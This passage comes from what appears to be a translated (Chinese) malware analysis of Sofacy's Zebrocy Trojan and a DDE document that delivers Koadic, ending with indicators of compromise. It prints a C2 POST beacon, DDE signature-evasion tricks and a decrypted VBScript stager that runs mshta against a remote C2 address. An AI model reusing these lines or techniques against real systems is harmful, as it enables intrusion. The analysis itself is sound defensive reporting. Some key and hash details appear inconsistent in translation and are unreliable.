3 – porg=
4 – Content-Length:
Trojan木马程序使用原始套接字与其C2服务器通信，并使用上面解密的字符串创建HTTP请求。它首先用一个参数1调用这个特定的子函数，以获得C2连接的IP地址。然后，它使用参数2调用子函数，以获取它将用作HTTP
POST请求的字符串。然后，主函数用参数3调用子函数来获取POST数据参数(“porg”)以及卷序列号和计算机名，并通过HTTP
POST请求将数据发送到C2。得到的HTTP POST请求如下所示：
    POST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1
    Host: 185.25.50[.]93
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 21
    porg=44908AE0524f422d
在分析过程中，我们没有看到C2服务器响应我们的请求，但是，我们知道Trojan木马程序将如何解析C2对特定数据的响应。
    -1 – Deletes the buffer and exits the Trojan.
    009 – Deletes the buffers and exits the Trojan.
如果在HTTP响应开始时没有找到上述任何值，则Trojan木马程序会检查C2响应以获取十六进制字节的ASCII表示形式。Trojan木马程序会将这些十六进制字节转换为二进制值并将其写入文件，并使用ShellExecuteWAPI函数使用“open”函数运行该文件。
我们在Zebrocy C++示例中看到了以下HTTP POST参数：
    porg
    structOne
    oq
    volume
###  DDE细节
2018年2月袭击事件中使用的DDE文件的作者使用了一些混淆技术以逃避侦查。首先，DDE指令在很大程度上依赖于QUOTE字段，该字段将十进制值转换为它们的ASCII等效字符。此外，作者将“dde”命令中的“E”大写，以避免大写大小写敏感签名。最后，作者在“dde”命令中对“dd”字符进行了粗体处理，该命令将DOCX文件(Word/Docent.xml)的XML中的字符串分割开来，从而使签名开发变得困难，如下所示：
      dd
      E 
除了前面提到的DOCX文件之外，我们还发现了另一个相关的启用DDE的文档，该文档基于与Zebrocy C2
IP地址重叠的基础设施。这个相关的交付文档是一个RTF文件，它下载并安装了一个payload，用于加载开放源码的koadi工具。我们没有遥测目标或攻击向量，但我们知道RTF文件使用DDE下载和执行一个加载Koadic的可执行文件。
payload(abbad7acd…)是一个可执行文件，它似乎是由VBScript为可执行工具创建的，并使用加密程序进一步混淆。我们的分析显示了一些可能的联系，由[F2KO
Software](http://www.f2ko.de/en/index.php)的VBS到EXE工具，但我们还没有确认是否直接重叠。我们相信参与者在payload上使用了一个密码器，因为它从其资源中获取文件名和脚本，并通过将每个字节乘以负字节来解码这些资源。然后，payload使用MD5散列(14331
D289e737093994395d3fc412afc)，该散列似乎是一个硬编码的SHA1散列(B6A75B1EF701710D7AEADE0FE93DE8477F3BD506)作为RC4密钥来解密得到的解码数据。例如，资源中存在以下数据：
fb 70 b0 c9 bd c5 8a d4 0c 54 fd 4c 6d bb f0 0f
通过将每个字节与-1相乘，我们获得了以下数据：
05 90 50 37 43 3b 76 2c f4 ac 03 b4 93 45 10 f1
在使用RC4和键14331d289e737093395d3fc412afc之后，将显示以下明文数据：
x00x00x00x00FlashRun.vbs
我们没有看到使用此FlashRun.vbs文件名的payload，而是使用临时文件名存储嵌入式VBScript文件，如%temp%4
tmp5.vbs。从资源中检索嵌入式VBScript，并使用与上面讨论的相同的算法对其进行解密，从而得到以下明文：
    set objshell = createobject("wscript.shell")
    objshell.run "mshta hxxp://86.106.131.177:6500/zIZFh",vbhide
Koadic
C2服务器将用Javascript代码响应这一请求，该代码充当Koadic登台的payload，使参与者能够在终端系统上运行额外的Koadic模块，以执行他们攻击的后续活动。不幸的是，在我们的分析过程中，我们没有观察到Sofacy使用的Koadi模块。
###  IOCs
**Domain**
supservermgr[.]com
**URL**
hxxp://supservermgr[.]com/sys/upd/pageupd.php
**Zebrocy**
d697160aecf152a81a89a6b5a7d9e1b8b5e121724038c676157ac72f20364edc  
cba5ab65a24be52214736bc1a5bc984953a9c15d0a3826d5b15e94036e5497df  
25f0d1cbcc53d8cfd6d848e12895ce376fbbfaf279be591774b28f70852a4fd8  
115fd8c619fa173622c7a1e84efdf6fed08a25d3ca3095404dcbd5ac3deb1f03  
f27836430742c9e014e1b080d89c47e43db299c2e00d0c0801a2830b41b57bc1  
5b5e80f63c04402d0b282e95e32155b2f86cf604a6837853ab467111d4ac15e2  
dd7e69e14c88972ac173132b90b3f4bfb2d1faec15cca256a256dd3a12b6e75d
**Koadic**
abbad7acd50754f096fdc6551e728aa6054dcf8e55946f90a02b17db552471ca
**User Agents**
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322;
.NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1)
Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko
Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1
**IPs**
185.25.51[.]198  
185.25.50[.]93  
220.158.216[.]127  
92.114.92[.]102  
86.106.131[.]177
**DDE Docs**
85da72c7dbf5da543e10f3f806afd4ebf133f27b6af7859aded2c3a6eced2fd5  
8cf3bc2bf36342e844e9c8108393562538a9af2a1011c80bb46416c0572c86ff